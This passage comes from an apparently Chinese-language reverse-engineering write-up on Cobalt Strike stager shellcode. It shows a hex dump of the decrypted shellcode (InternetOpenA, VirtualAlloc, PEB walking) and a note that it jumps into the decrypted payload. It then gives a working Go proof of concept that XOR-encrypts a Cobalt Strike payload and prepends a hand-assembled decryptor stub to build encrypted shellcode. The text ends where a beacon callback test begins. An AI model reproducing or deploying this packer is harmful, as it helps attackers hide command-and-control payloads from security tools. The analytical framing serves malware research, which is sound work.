    0000017B1B5C0101 41 C7 45 F7 49 6E 74 65 C7 45 FB 72 6E 65 74 C7 AÇE÷InteÇEûrnetÇ 
    0000017B1B5C0111 45 FF 4F 70 65 6E 66 C7 45 03 41 00 C7 45 E7 56 EÿOpenfÇE.A.ÇEçV 
    0000017B1B5C0121 69 72 74 C7 45 EB 75 61 6C 41 C7 45 EF 6C 6C 6F irtÇEëualAÇEïllo 
    0000017B1B5C0131 63 65 48 8B 04 25 60 00 00 00 48 8B 48 18 4C 8B ceH..%`...H.H.L. 
    0000017B1B5C0141 41 20 EB 12 49 8B 40 50 66 44 39 68 18 0F 84 4D A ë.I.@PfD9h...M 
    0000017B1B5C0151 01 00 00 4D 8B 00 4D 85 C0 75 E9 4C 8B 45 67 49 ...M..M.ÀuéL.EgI 
    0000017B1B5C0161 63 40 3C 41 8B D5 46 8B 8C 00 88 00 00 00 4D 03 c@¨¯..........
解密后使用 jmp 指令跳转执行：
    0000017B1B5C003E | 49:FFE0             | jmp r8                           |
之后的部分即是实现 CS Stager 功能的 payload 部分，可以参考我之前的 《CS 4.7 Stager 逆向及 Shellcode 重写》的
shellcode 分析部分，这里不再详细分析。
# 4\. PoC
通过上面的分析，我们可以将这段 shellcode 拆解成解密器、密钥、payload 三个部分，知道了原理，我们就可以自己实现一个脚本来生成这样一段
shellcode 了，这里我直接使用 CS 的原生 payload 作为被加密的内容，所以只需要实现其中的解密器和密钥即可，PoC如下：
    package main
    import (
        "bytes"
        "encoding/binary"
        "io/ioutil"
        "math/rand"
        "time"
    )
    // 生成随机密钥
    func GenRandomKey() []byte {
        rand.Seed(time.Now().UnixNano())
        key := make([]byte, 12)
        rand.Read(key)
        return key
    }
    // 使用密钥对payload进行加密
    func XorEncrypt(payload []byte, key []byte) []byte {
        var xored_payload []byte
        for i := 0; i < len(payload); i++ {
            xored_payload = append(xored_payload, payload[i]^key[i%len(key)])
        }
        return xored_payload
    }
    // 生成解密器
    func MakeDecryptor(payload []byte, key []byte) []byte {
        prefix := []byte{0x4C, 0x8D, 0x1D, 0x3D, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4D, 0x8D, 0x43, 0x0D, 0x4D, 0x8B, 0xD0, 0xB8, 0xAB, 0xAA, 0xAA, 0xAA, 0x41, 0xF7, 0xE1, 0x41, 0x8B, 0xC1, 0x41, 0xFF, 0xC1, 0xC1, 0xEA, 0x03, 0x8D, 0x0C, 0x52, 0xC1, 0xE1, 0x02, 0x2B, 0xC1, 0x42, 0x8A, 0x44, 0x18, 0x01, 0x41, 0x30, 0x02, 0x49, 0xFF, 0xC2, 0x41, 0x81, 0xF9}
        suffix := []byte{0x72, 0xD3, 0x49, 0xFF, 0xE0, 0xCC, 0xCC, 0xCC, 0xC2}
        size := int32(len(payload))
        bytesBuffer := bytes.NewBuffer([]byte{})
        binary.Write(bytesBuffer, binary.LittleEndian, size)
        decryptor := append(append(prefix, bytesBuffer.Bytes()...), suffix...)
        return decryptor
    }
    func main() {
        key := GenRandomKey()
        payload, _ := ioutil.ReadFile("payload.bin")
        xored_payload := XorEncrypt(payload, key)
        decryptor := MakeDecryptor(payload, key)
        shellcode := append(append(decryptor, key...), xored_payload...)
        _ = ioutil.WriteFile("shellcode.bin", shellcode, 0666)
    }
测试上线：